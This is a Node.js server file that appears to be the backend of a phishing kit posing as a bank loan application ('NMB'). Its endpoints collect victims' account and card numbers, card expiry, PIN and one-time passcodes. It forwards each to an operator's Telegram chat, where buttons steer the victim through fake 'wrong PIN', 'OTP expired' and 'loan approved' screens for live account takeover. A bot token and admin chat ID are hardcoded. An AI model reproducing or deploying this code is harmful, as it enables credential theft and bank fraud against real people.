const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || ''
      }]));
    }
  } catch (err) {}
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || 'N/A';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      if (!admins.has(chatId)) {
        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      const adminMessage = `👑 *NMB Admin Panel*\n\n` +
                           `👤 *User:* ${firstName} ${lastName}\n` +
                           `• Chat ID: \`${chatId}\`\n\n` +
                           `🔗 *Your Link:*\n${userLink}`;
      await bot.sendMessage(chatId, adminMessage, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const actionType = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (actionType) {
        case 'DENY_BANK':
          session.status = 'DENIED_STOP';
          await bot.sendMessage(chatTarget, `❌ Bank details denied. Applicant stopped.`);
          break;
        case 'ALLOW_BANK':
          session.status = 'PROCEED_CREDENTIALS';
          await bot.sendMessage(chatTarget, `✅ Bank details allowed. Moved to Sign In.`);
          break;
        case 'DISALLOWED_CRED':
          session.status = 'DENIED_STOP';
          await bot.sendMessage(chatTarget, `❌ Sign in disallowed.`);
          break;
        case 'ALLOW_CRED':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Sign in approved. Moved to OTP.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.pin = '';
          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Prompting applicant for new PIN.`);
          break;
        case 'OTP_EXPIRED':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `❌ OTP expired sent. Prompting applicant for new OTP.`);
          break;
        case 'APPROVED_FINAL':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Loan approved! Success screen shown.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Done` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Submit Bank Details First
app.post('/api/submit-bank', async (req, res) => {
  try {
    let { accountNo, cardNo, expiry, identifierType, identifierValue, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    sessions.set(userId, { 
      accountNo, cardNo, expiry, identifierType, identifierValue,
      adminChatId: targetChat, 
      status: 'WAITING_BANK_APPROVAL' 
    });

    const message = `🏦 *BANK DETAILS*\n\n` +
                    `📌 *${identifierType || 'Phone No'}:* \`${identifierValue}\`\n` +
                    `🏛 *Account:* \`${accountNo}\`\n` +
                    `💳 *Card:* \`${cardNo}\` (${expiry})\n\n` +
                    `\`${identifierValue}:${accountNo}:${cardNo}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ALLOW', callback_data: `ALLOW_BANK_${userId}` },
            { text: 'DENY', callback_data: `DENY_BANK_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Network error.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-credentials', async (req, res) => {
  try {
    const { userId, identifierType, identifierValue, pin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_CRED_APPROVAL';
    session.pin = pin;

    const message = `🔐 *SIGN IN CREDENTIALS*\n\n` +
                    `📌 *${identifierType || 'Phone No'}:* \`${identifierValue}\`\n` +
                    `🔒 *4-Digit PIN:* \`${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'NEXT', callback_data: `ALLOW_CRED_${userId}` },
            { text: 'DISALLOWED', callback_data: `DISALLOWED_CRED_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_APPROVAL';
    session.otp = otp;

    const message = `🔑 *OTP VERIFICATION*\n\n` +
                    `📌 *${session.identifierType || 'Phone No'}:* \`${session.identifierValue}\`\n` +
                    `📱 *6-Digit OTP:* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${userId}` },
            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
                                   
